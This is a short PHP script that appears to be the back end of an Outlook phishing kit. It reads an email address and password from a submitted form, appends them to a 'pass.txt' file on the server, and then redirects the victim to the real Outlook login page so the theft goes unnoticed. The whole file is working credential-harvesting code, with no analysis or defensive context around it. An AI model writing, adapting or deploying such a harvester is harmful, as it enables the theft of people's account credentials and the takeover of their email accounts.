<?php
$email = $_POST["email"];
$password = $_POST["password"];
$text = "/////////////////////
USERNAME: $email 
PASSWORD: $password
/////////////////////"; 
$file = "/var/www/html/ULTIMATE/php/txt/pass.txt";
$fp = fopen($file, "a") or die("Couldn't open $file for writing!");
fwrite($fp, $text) or die("Couldn't write values to file!"); 
fclose($fp);
?>
<meta http-equiv="refresh" content="0; url=https://outlook.live.com/owa/" />`
